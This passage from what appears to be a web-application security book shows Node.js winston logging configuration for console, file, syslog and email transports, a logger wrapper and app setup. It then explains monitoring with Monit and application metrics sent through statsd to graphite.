<code class="lineno">28 </code>         <code class="nx">colorize</code><code class="o">:</code> <code class="kc">true</code>
<code class="lineno">29 </code>      <code class="p">},</code>
<code class="lineno">30 </code>      <code class="nx">fileTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">31 </code>         <code class="nx">level</code><code class="o">:</code> <code class="s1">'debug'</code><code class="p">,</code>
<code class="lineno">32 </code>         <code class="nx">filename</code><code class="o">:</code> <code class="s1">'./yourapp.log'</code><code class="p">,</code>         
<code class="lineno">33 </code>         <code class="nx">handleExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno">34 </code>         <code class="nx">json</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno">35 </code>         <code class="nx">maxsize</code><code class="o">:</code> <code class="mi">5242880</code><code class="p">,</code> <code class="c1">//5MB</code>
<code class="lineno">36 </code>         <code class="nx">maxFiles</code><code class="o">:</code> <code class="mi">5</code><code class="p">,</code>
<code class="lineno">37 </code>         <code class="nx">colorize</code><code class="o">:</code> <code class="kc">false</code>
<code class="lineno">38 </code>      <code class="p">},</code>
<code class="lineno">39 </code>      <code class="nx">syslogPosixTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">40 </code>         <code class="nx">handleExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno">41 </code>         <code class="nx">level</code><code class="o">:</code> <code class="s1">'debug'</code><code class="p">,</code>
<code class="lineno">42 </code>         <code class="nx">identity</code><code class="o">:</code> <code class="s1">'yourapp_winston'</code>
<code class="lineno">43 </code>         <code class="c1">//facility: 'local0' // default</code>
<code class="lineno">44 </code>            <code class="c1">// /etc/rsyslog.conf also needs: local0.* /var/log/yourapp.log</code>
<code class="lineno">45 </code>            <code class="c1">// If non posix syslog is used, then /etc/rsyslog.conf or one</code>
<code class="lineno">46 </code>            <code class="c1">// of the files in /etc/rsyslog.d/ also needs the following</code>
<code class="lineno">47 </code>            <code class="c1">// two settings:</code>
<code class="lineno">48 </code>            <code class="c1">// $ModLoad imudp // Load the udp module.</code>
<code class="lineno">49 </code>            <code class="c1">// $UDPServerRun 514 // Open the standard syslog port.</code>
<code class="lineno">50 </code>            <code class="c1">// $UDPServerAddress 127.0.0.1 // Interface to bind to.</code>
<code class="lineno">51 </code>      <code class="p">},</code>
<code class="lineno">52 </code>      <code class="nx">emailTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">53 </code>         <code class="nx">handleExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno">54 </code>         <code class="nx">level</code><code class="o">:</code> <code class="s1">'crit'</code><code class="p">,</code>
<code class="lineno">55 </code>         <code class="nx">from</code><code class="o">:</code> <code class="s1">'yourusername_alerts@fastmail.com'</code><code class="p">,</code>
<code class="lineno">56 </code>         <code class="nx">to</code><code class="o">:</code> <code class="s1">'yourusername_alerts@fastmail.com'</code><code class="p">,</code>
<code class="lineno">57 </code>         <code class="nx">service</code><code class="o">:</code> <code class="s1">'FastMail'</code><code class="p">,</code>
<code class="lineno">58 </code>         <code class="nx">auth</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">59 </code>            <code class="nx">user</code><code class="o">:</code> <code class="s2">"yourusername_alerts"</code><code class="p">,</code>
<code class="lineno">60 </code>            <code class="nx">pass</code><code class="o">:</code> <code class="kc">null</code> <code class="c1">// App specific password.</code>
<code class="lineno">61 </code>         <code class="p">},</code>
<code class="lineno">62 </code>         <code class="nx">tags</code><code class="o">:</code> <code class="p">[</code><code class="s1">'yourapp'</code><code class="p">]</code>      
<code class="lineno">63 </code>      <code class="p">}</code>
<code class="lineno">64 </code>   <code class="p">}</code>   
<code class="lineno">65 </code><code class="p">}</code>
</pre></div>

</figure>

<p>In development I have chosen here to not use syslog. You can see this on line 3 below. If you want to test syslog in development, you can either remove the logger object override from the <code>devbox1-development.js</code> file or modify it to be similar to the above. Then add one line to the <code>/etc/rsyslog.conf</code> file to turn on. As mentioned in a comment above in the <code>default.js</code> config file on line 44.</p>

<figure class="code">
  <figcaption>devbox1-development.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno">1 </code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
<code class="lineno">2 </code>   <code class="nx">logger</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">3 </code>      <code class="nx">syslogPosixTransportOptions</code><code class="o">:</code> <code class="kc">null</code>
<code class="lineno">4 </code>   <code class="p">}</code>
<code class="lineno">5 </code><code class="p">}</code>
</pre></div>

</figure>

<p>In production we log to syslog and because of that we do not need the file transport you can see configured starting on line 30 above in the <code>default.js</code> configuration file, so we set it to null as seen on line 6 below in the <code>prodbox-production.js</code> file.</p>

<p>I have gone into more depth about how we handle syslogs in the VPS chapter under the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">Logging and Alerting</a> section, where all of our logs including these ones get streamed to an off-site syslog server. Thus providing easy aggregation of all system logs into one user interface that DevOpps can watch on their monitoring panels in real-time and also easily go back in time to visit past events. This provides excellent visibility as one layer of defence.</p>

<p>There were also some other <a href="http://help.papertrailapp.com/kb/configuration/configuring-centralized-logging-from-nodejs-apps/">options</a> for those using Papertrail as their off-site syslog and aggregation PaaS, but the solutions were not as clean as simply logging to local syslog from your applications and then sending off-site from there. Again this is discussed in more depth in the “Logging and Alerting” section in the VPS chapter.</p>

<figure class="code">
  <figcaption>prodbox-production.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
<code class="lineno"> 2 </code>   <code class="nx">logger</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno"> 3 </code>      <code class="nx">consoleTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno"> 4 </code>         <code class="nx">level</code><code class="o">:</code> <code class="p">{},</code>
<code class="lineno"> 5 </code>      <code class="p">},</code>
<code class="lineno"> 6 </code>      <code class="nx">fileTransportOptions</code><code class="o">:</code> <code class="kc">null</code><code class="p">,</code>
<code class="lineno"> 7 </code>      <code class="nx">syslogPosixTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno"> 8 </code>         <code class="nx">handleExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno"> 9 </code>         <code class="nx">level</code><code class="o">:</code> <code class="s1">'info'</code><code class="p">,</code>
<code class="lineno">10 </code>         <code class="nx">identity</code><code class="o">:</code> <code class="s1">'yourapp_winston'</code>
<code class="lineno">11 </code>      <code class="p">}</code>
<code class="lineno">12 </code>   <code class="p">}</code>
<code class="lineno">13 </code><code class="p">}</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>local.js</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Build creates this file.</code>
<code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">logger</code><code class="o">:</code> <code class="p">{</code>
      <code class="nx">emailTransportOptions</code><code class="o">:</code> <code class="p">{</code>
         <code class="nx">auth</code><code class="o">:</code> <code class="p">{</code>
            <code class="nx">pass</code><code class="o">:</code> <code class="s1">'Z-o?(7GnCQsnrx/!-G=LP]-ib'</code> <code class="c1">// App specific password.</code>
         <code class="p">}</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>The <code>logger.js</code> file wraps and hides extra features and transports applied to the logging package we are consuming.</p>

<figure class="code">
  <figcaption>logger.js</figcaption>

<div class="highlight"><pre><code></code><code class="kd">var</code> <code class="nx">winston</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'winston'</code><code class="p">);</code>
<code class="kd">var</code> <code class="nx">loggerConfig</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'config'</code><code class="p">).</code><code class="nx">logger</code><code class="p">;</code>
<code class="nx">require</code><code class="p">(</code><code class="s1">'winston-syslog-posix'</code><code class="p">).</code><code class="nx">SyslogPosix</code><code class="p">;</code>
<code class="nx">require</code><code class="p">(</code><code class="s1">'winston-email'</code><code class="p">).</code><code class="nx">Email</code><code class="p">;</code>

<code class="nx">winston</code><code class="p">.</code><code class="nx">emitErrs</code> <code class="o">=</code> <code class="kc">true</code><code class="p">;</code>

<code class="kd">var</code> <code class="nx">logger</code> <code class="o">=</code> <code class="k">new</code> <code class="nx">winston</code><code class="p">.</code><code class="nx">Logger</code><code class="p">({</code>
   <code class="c1">// Alternatively: set to winston.config.syslog.levels</code>
   <code class="nx">exitOnError</code><code class="o">:</code> <code class="kc">false</code><code class="p">,</code>
   <code class="c1">// Alternatively use winston.addColors(customColours); There are many ways</code>
   <code class="c1">// to do the same thing with winston</code>
   <code class="nx">colors</code><code class="o">:</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">colours</code><code class="p">,</code>
   <code class="nx">levels</code><code class="o">:</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">levels</code>
<code class="p">});</code>

<code class="c1">// Add transports. There are plenty of options provided and you can add your own.</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">addConsole</code> <code class="o">=</code> <code class="kd">function</code><code class="p">(</code><code class="nx">config</code><code class="p">)</code> <code class="p">{</code>
   <code class="nx">logger</code><code class="p">.</code><code class="nx">add</code> <code class="p">(</code><code class="nx">winston</code><code class="p">.</code><code class="nx">transports</code><code class="p">.</code><code class="nx">Console</code><code class="p">,</code> <code class="nx">config</code><code class="p">);</code>
   <code class="k">return</code> <code class="k">this</code><code class="p">;</code>
<code class="p">};</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">addFile</code> <code class="o">=</code> <code class="kd">function</code><code class="p">(</code><code class="nx">config</code><code class="p">)</code> <code class="p">{</code>
   <code class="nx">logger</code><code class="p">.</code><code class="nx">add</code> <code class="p">(</code><code class="nx">winston</code><code class="p">.</code><code class="nx">transports</code><code class="p">.</code><code class="nx">File</code><code class="p">,</code> <code class="nx">config</code><code class="p">);</code>
   <code class="k">return</code> <code class="k">this</code><code class="p">;</code>
<code class="p">};</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">addPosixSyslog</code> <code class="o">=</code> <code class="kd">function</code><code class="p">(</code><code class="nx">config</code><code class="p">)</code> <code class="p">{</code>
   <code class="nx">logger</code><code class="p">.</code><code class="nx">add</code> <code class="p">(</code><code class="nx">winston</code><code class="p">.</code><code class="nx">transports</code><code class="p">.</code><code class="nx">SyslogPosix</code><code class="p">,</code> <code class="nx">config</code><code class="p">);</code>
   <code class="k">return</code> <code class="k">this</code><code class="p">;</code>
<code class="p">};</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">addEmail</code> <code class="o">=</code> <code class="kd">function</code><code class="p">(</code><code class="nx">config</code><code class="p">)</code> <code class="p">{</code>
   <code class="nx">logger</code><code class="p">.</code><code class="nx">add</code> <code class="p">(</code><code class="nx">winston</code><code class="p">.</code><code class="nx">transports</code><code class="p">.</code><code class="nx">Email</code><code class="p">,</code> <code class="nx">config</code><code class="p">);</code>
   <code class="k">return</code> <code class="k">this</code><code class="p">;</code>
<code class="p">};</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">emailLoggerFailure</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">err</code> <code class="cm">/*level, msg, meta*/</code><code class="p">)</code> <code class="p">{</code>
   <code class="c1">// If called with an error, then only the err param is supplied.</code>
   <code class="c1">// If not called with an error, level, msg and meta are supplied.</code>
   <code class="k">if</code> <code class="p">(</code><code class="nx">err</code><code class="p">)</code> <code class="nx">logger</code><code class="p">.</code><code class="nx">alert</code><code class="p">(</code>
      <code class="nx">JSON</code><code class="p">.</code><code class="nx">stringify</code><code class="p">(</code>
         <code class="s1">'error-code:'</code> <code class="o">+</code> <code class="nx">err</code><code class="p">.</code><code class="nx">code</code> <code class="o">+</code> <code class="s1">'. '</code>
         <code class="o">+</code> <code class="s1">'error-message:'</code> <code class="o">+</code> <code class="nx">err</code><code class="p">.</code><code class="nx">message</code> <code class="o">+</code> <code class="s1">'. '</code>
         <code class="o">+</code> <code class="s1">'error-response:'</code> <code class="o">+</code> <code class="nx">err</code><code class="p">.</code><code class="nx">response</code> <code class="o">+</code> <code class="s1">'. logger-level:'</code>
         <code class="o">+</code> <code class="nx">err</code><code class="p">.</code><code class="nx">transport</code><code class="p">.</code><code class="nx">level</code> <code class="o">+</code> <code class="s1">'. transport:'</code> <code class="o">+</code> <code class="nx">err</code><code class="p">.</code><code class="nx">transport</code><code class="p">.</code><code class="nx">name</code>
      <code class="p">)</code>
   <code class="p">);</code>
<code class="p">};</code>

<code class="nx">logger</code><code class="p">.</code><code class="nx">init</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
   <code class="k">if</code> <code class="p">(</code><code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">fileTransportOptions</code><code class="p">)</code>
      <code class="nx">logger</code><code class="p">.</code><code class="nx">addFile</code><code class="p">(</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">fileTransportOptions</code> <code class="p">);</code>
   <code class="k">if</code> <code class="p">(</code><code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">consoleTransportOptions</code><code class="p">)</code>
      <code class="nx">logger</code><code class="p">.</code><code class="nx">addConsole</code><code class="p">(</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">consoleTransportOptions</code> <code class="p">);</code>
   <code class="k">if</code> <code class="p">(</code><code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">syslogPosixTransportOptions</code><code class="p">)</code>
      <code class="nx">logger</code><code class="p">.</code><code class="nx">addPosixSyslog</code><code class="p">(</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">syslogPosixTransportOptions</code> <code class="p">);</code>
   <code class="k">if</code> <code class="p">(</code><code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">emailTransportOptions</code><code class="p">)</code>
      <code class="nx">logger</code><code class="p">.</code><code class="nx">addEmail</code><code class="p">(</code> <code class="nx">loggerConfig</code><code class="p">.</code><code class="nx">emailTransportOptions</code> <code class="p">);</code>
<code class="p">};</code>

<code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="nx">logger</code><code class="p">;</code>
<code class="nx">module</code><code class="p">.</code><code class="nx">exports</code><code class="p">.</code><code class="nx">stream</code> <code class="o">=</code> <code class="p">{</code>
   <code class="nx">write</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">message</code><code class="p">,</code> <code class="nx">encoding</code><code class="p">)</code> <code class="p">{</code>      
      <code class="nx">logger</code><code class="p">.</code><code class="nx">info</code><code class="p">(</code><code class="nx">message</code><code class="p">);</code>
   <code class="p">}</code>
<code class="p">};</code>
</pre></div>

</figure>

<p>When the app first starts it initialises the logger on line 15 below.</p>

<figure class="code">
  <figcaption>app.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="kd">var</code> <code class="nx">http</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'http'</code><code class="p">);</code>
<code class="lineno"> 2 </code><code class="kd">var</code> <code class="nx">express</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'express'</code><code class="p">);</code>
<code class="lineno"> 3 </code><code class="kd">var</code> <code class="nx">path</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'path'</code><code class="p">);</code>
<code class="lineno"> 4 </code><code class="kd">var</code> <code class="nx">morganLogger</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'morgan'</code><code class="p">);</code>
<code class="lineno"> 5 </code><code class="c1">// Due to bug in node-config the next line is needed before config</code>
<code class="lineno"> 6 </code><code class="c1">// is required: https://github.com/lorenwest/node-config/issues/202</code>
<code class="lineno"> 7 </code><code class="k">if</code> <code class="p">(</code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code> <code class="o">===</code> <code class="s1">'production'</code><code class="p">)</code>
<code class="lineno"> 8 </code>   <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_CONFIG_DIR</code> <code class="o">=</code> <code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code> <code class="s1">'config'</code><code class="p">);</code>
<code class="lineno"> 9 </code><code class="c1">// Yes the following are hoisted, but it's OK in this situation.</code>
<code class="lineno">10 </code><code class="kd">var</code> <code class="nx">logger</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'./util/logger'</code><code class="p">);</code> <code class="c1">// Or use requireFrom module so no relative paths.</code>
<code class="lineno">11 </code><code class="c1">//...</code>
<code class="lineno">12 </code><code class="kd">var</code> <code class="nx">errorHandler</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'errorhandler'</code><code class="p">);</code>
<code class="lineno">13 </code><code class="kd">var</code> <code class="nx">app</code> <code class="o">=</code> <code class="nx">express</code><code class="p">();</code>
<code class="lineno">14 </code><code class="c1">//...</code>
<code class="lineno">15 </code><code class="nx">logger</code><code class="p">.</code><code class="nx">init</code><code class="p">();</code>
<code class="lineno">16 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'port'</code><code class="p">,</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">PORT</code> <code class="o">||</code> <code class="mi">3000</code><code class="p">);</code>
<code class="lineno">17 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'views'</code><code class="p">,</code> <code class="nx">__dirname</code> <code class="o">+</code> <code class="s1">'/views'</code><code class="p">);</code>
<code class="lineno">18 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'view engine'</code><code class="p">,</code> <code class="s1">'jade'</code><code class="p">);</code>
<code class="lineno">19 </code><code class="c1">//...</code>
<code class="lineno">20 </code><code class="c1">// In order to utilise connect/express logger module in our third party logger,</code>
<code class="lineno">21 </code><code class="c1">// Pipe the messages through.</code>
<code class="lineno">22 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">morganLogger</code><code class="p">(</code><code class="s1">'combined'</code><code class="p">,</code> <code class="p">{</code><code class="nx">stream</code><code class="o">:</code> <code class="nx">logger</code><code class="p">.</code><code class="nx">stream</code><code class="p">}));</code>
<code class="lineno">23 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">methodOverride</code><code class="p">());</code>
<code class="lineno">24 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">bodyParser</code><code class="p">.</code><code class="nx">json</code><code class="p">());</code>
<code class="lineno">25 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">bodyParser</code><code class="p">.</code><code class="nx">urlencoded</code><code class="p">({</code> <code class="nx">extended</code><code class="o">:</code> <code class="kc">true</code> <code class="p">}));</code>
<code class="lineno">26 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">express</code><code class="p">.</code><code class="kr">static</code><code class="p">(</code><code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code> <code class="s1">'public'</code><code class="p">)));</code>
<code class="lineno">27 </code><code class="c1">//...</code>
<code class="lineno">28 </code><code class="nx">require</code><code class="p">(</code><code class="s1">'./routes'</code><code class="p">)(</code><code class="nx">app</code><code class="p">);</code>
<code class="lineno">29 </code>
<code class="lineno">30 </code><code class="k">if</code> <code class="p">(</code><code class="s1">'development'</code> <code class="o">==</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'env'</code><code class="p">))</code> <code class="p">{</code>
<code class="lineno">31 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">errorHandler</code><code class="p">({</code> <code class="nx">dumpExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code> <code class="nx">showStack</code><code class="o">:</code> <code class="kc">true</code> <code class="p">}));</code>
<code class="lineno">32 </code>   <code class="c1">//...</code>
<code class="lineno">33 </code><code class="p">}</code>
<code class="lineno">34 </code><code class="k">if</code> <code class="p">(</code><code class="s1">'production'</code> <code class="o">==</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'env'</code><code class="p">))</code> <code class="p">{</code>
<code class="lineno">35 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">errorHandler</code><code class="p">());</code>
<code class="lineno">36 </code>   <code class="c1">//...</code>
<code class="lineno">37 </code><code class="p">}</code>
<code class="lineno">38 </code>
<code class="lineno">39 </code><code class="nx">http</code><code class="p">.</code><code class="nx">createServer</code><code class="p">(</code><code class="nx">app</code><code class="p">).</code><code class="nx">listen</code><code class="p">(</code><code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'port'</code><code class="p">),</code> <code class="kd">function</code><code class="p">(){</code>
<code class="lineno">40 </code>   <code class="nx">logger</code><code class="p">.</code><code class="nx">info</code><code class="p">(</code>
<code class="lineno">41 </code>      <code class="s2">"Express server listening on port "</code> <code class="o">+</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'port'</code><code class="p">)</code> <code class="o">+</code> <code class="s1">' in '</code>
<code class="lineno">42 </code>      <code class="o">+</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code> <code class="o">+</code> <code class="s1">' mode'</code>
<code class="lineno">43 </code>   <code class="p">);</code>
<code class="lineno">44 </code><code class="p">});</code>
</pre></div>

</figure>

<ul>
  <li>You can also optionally log JSON metadata</li>
  <li>You can provide an optional callback to do any work required, which will be called once all transports have logged the specified message.</li>
</ul>

<p>Here are some examples of how you can use the logger. The <code>logger.log(level</code> can be replaced with <code>logger.&lt;level&gt;(</code> where level is any of the levels defined in the <code>default.js</code> configuration file above:</p>

<figure class="code">
  <figcaption>Anywhere you need logging</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// With string interpolation also.</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code><code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message %s'</code><code class="p">,</code> <code class="s1">'my string'</code><code class="p">);</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code><code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message %d'</code><code class="p">,</code> <code class="mi">123</code><code class="p">);</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code><code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message %j'</code><code class="p">,</code> <code class="p">{</code><code class="nx">aPropertyName</code><code class="o">:</code> <code class="s1">'Some message details'</code><code class="p">},</code> <code class="p">{});</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code>
   <code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message %s, %s'</code><code class="p">,</code> <code class="s1">'first'</code><code class="p">,</code> <code class="s1">'second'</code><code class="p">,</code>
   <code class="p">{</code><code class="nx">aPropertyName</code><code class="o">:</code> <code class="s1">'Some message details'</code><code class="p">}</code>
<code class="p">);</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code>
   <code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message'</code><code class="p">,</code> <code class="s1">'first'</code><code class="p">,</code> <code class="s1">'second'</code><code class="p">,</code> <code class="p">{</code><code class="nx">aPropertyName</code><code class="o">:</code> <code class="s1">'Some message details'</code><code class="p">}</code>
<code class="p">);</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code>
   <code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message %s, %s'</code><code class="p">,</code> <code class="s1">'first'</code><code class="p">,</code> <code class="s1">'second'</code><code class="p">,</code>
   <code class="p">{</code><code class="nx">aPropertyName</code><code class="o">:</code> <code class="s1">'Some message details'</code><code class="p">},</code> <code class="nx">logger</code><code class="p">.</code><code class="nx">emailLoggerFailure</code>
<code class="p">);</code>
<code class="nx">logger</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code>
   <code class="s1">'info'</code><code class="p">,</code> <code class="s1">'test message'</code><code class="p">,</code> <code class="s1">'first'</code><code class="p">,</code> <code class="s1">'second'</code><code class="p">,</code>
   <code class="p">{</code><code class="nx">aPropertyName</code><code class="o">:</code> <code class="s1">'Some message details'</code><code class="p">},</code> <code class="nx">logger</code><code class="p">.</code><code class="nx">emailLoggerFailure</code>
<code class="p">);</code>
</pre></div>

</figure>

<p>As an architectural concern, also consider hiding cross cutting concerns like logging using Aspect Oriented Programming (AOP).</p>

<h5 id="leanpub-auto-insufficient-monitoring">Insufficient Monitoring</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p>There are a couple of ways of approaching monitoring. You may want to see and be notified of the health of your application only when it is not fine (sometimes called the dark cockpit approach), or whether it is fine or not. Personally I like to have both</p>

<h6 id="leanpub-auto-dark-cockpit">Dark Cockpit</h6>

<p>As discussed in the VPS chapter, Monit is an excellent tool for the dark cockpit approach. It’s easy to configure. Monit Has excellent easy to read, short <a href="https://mmonit.com/monit/documentation/monit.html">documentation</a> which is easy to understand, the configuration file has lots of examples commented out ready for you to take as is and modify to suite your environment. Remember I provided examples of monitoring a VPS and <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive">NodeJS web application</a> in the VPS chapter. I’ve personally had excellent success with Monit. Check the VPS chapter <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit">Monitoring section</a> for a refresher. Monit doesn’t just give you monitoring, it can also perform pre-defined actions based on current states of many VPS resources and their applications.</p>

<h6 id="web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing">Statistics Graphing</h6>

<p>Continuing on with the <a href="chap03.html#vps-countermeasures-lack-of-visibility-statistics-graphing">Statistics Graphing</a> section in the VPS chapter, we look at adding <a href="https://github.com/etsy/statsd/">statsd</a> as application instrumentation to our existing collectd -&gt; graphite set-up.</p>

<p>Just as collectd can collect and send data to graphite directly if collectd agent and server are on the same machine, or indirectly via a collectd server on another machine to provide continual system visibility, statsd can play a similar role as collectd agent/server but for our applications. </p>

<p>Statsd is a lightweight NodeJS daemon that collects and stores the statistics sent to it for a configurable amount of time (10 seconds by default) by listening for UDP packets containing them. Statsd then aggregates the statistics and flushes a single value for each statistic to its <a href="https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js#L125"><code>backends</code></a> (graphite in our case) using a TCP connection. The <a href="https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js#L50"><code>flushInterval</code></a> needs to be the same as the <code>retentions</code> interval in the Carbon <a href="https://graphite.readthedocs.io/en/latest/config-carbon.html#storage-schemas-conf"><code>/etc/carbon/storage-schemas.conf</code></a> file. This is how statsd <a href="https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#anatomy-of-statsd-data-metrics">gets around</a> the Carbon limitation of only accepting a single value per interval. The protocol that statsd expects to receive looks like the following, expecting a type in the third position instead of the timestamp that <a href="chap03.html#vps-countermeasures-lack-of-visibility-statistics-graphing-assembling-the-components-after">Carbon expects</a>:</p>

<figure class="code">
  <figcaption>statsd receiving protocol (syntax)</figcaption>

<div class="highlight"><pre><code></code>&lt;metric-name&gt;:&lt;actual-value&gt;|&lt;type&gt;
</pre></div>

</figure>

<p>Where <code>&lt;type&gt;</code> is one of the following:</p>

<figure class="code">
  <figcaption>Count</figcaption>

<div class="highlight"><pre><code></code>c
</pre></div>

</figure>

<p>This tells statsd to add up all of these values that it receives for a particular statistic during the flush interval and send the total on flush. A sample rate can also be provided from the statsd client as a decimal of the number of samples per event count:<br />
<code>&lt;metric-name&gt;:&lt;actual-value&gt;|c[|@&lt;sample-rate&gt;]</code><br />
So if the statistic is <a href="https://github.com/etsy/statsd/blob/master/docs/metric_types.md#sampling">only being sampled 1/10th of the time</a>:<br />
<code>&lt;metric-name&gt;:&lt;actual-value&gt;|c|@0.1</code>  </p>

<figure class="code">
  <figcaption>Timing</figcaption>

<div class="highlight"><pre><code></code>ms
</pre></div>

</figure>

<p>This value needs to be the timespan in milliseconds between a start and end time. This could be for example, the timespan that it took to hash a piece of data to be stored such as a password, or how long it took to pre-render an isomorphic web view. Just as with the count type, you can also provide a sample rate for timing as well. Statsd does quite a lot of work with timing data, it <a href="https://github.com/etsy/statsd/blob/master/docs/metric_types.md#timing">works out</a> percentiles, mean, standard deviation, sum, lower and upper bounds for the flush interval. This can be very useful for when you are making changes to your application and want to know if those changes are <a href="https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#timers">slowing it down</a>.</p>

<figure class="code">
  <figcaption>Gauges</figcaption>

<div class="highlight"><pre><code></code>g
</pre></div>

</figure>

